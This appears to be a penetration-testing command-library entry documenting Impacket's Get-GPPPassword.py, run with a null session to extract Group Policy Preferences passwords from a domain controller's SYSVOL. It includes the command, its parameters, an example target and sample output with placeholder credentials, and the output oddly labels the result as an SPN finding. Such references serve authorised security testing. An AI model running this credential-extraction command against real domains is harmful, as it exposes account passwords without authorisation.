---
id: 86664522-a143-44e1-9599-6677a7604ec7
name: Get GPP Password Null Session
type: command
executor: bash
data: Get-GPPPassword.py -no-pass $_DOMAIN_CONTROLLER
output: null
created_at: '2023-04-06T03:56:03.530334+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - impacket
  - gpp
  - null-session
verified: true
validated: true
---

# Get GPP Password Null Session

## Command

```bash
Get-GPPPassword.py -no-pass $_DOMAIN_CONTROLLER
```

## Description

Impacket tool to extract GPP passwords from SYSVOL using an anonymous SMB session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -no-pass | Use null session | Yes |
| $_DOMAIN_CONTROLLER | DC FQDN or IP | Yes |

## Examples

### Basic Usage

```bash
Get-GPPPassword.py -no-pass dc01.domain.com
```

## Expected Output

Service Principal Name (SPN) found:  
Username: svc_account  
Password: ExtractedPass789  
Context: Groups.xml in SYSVOL

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/Impacket]]
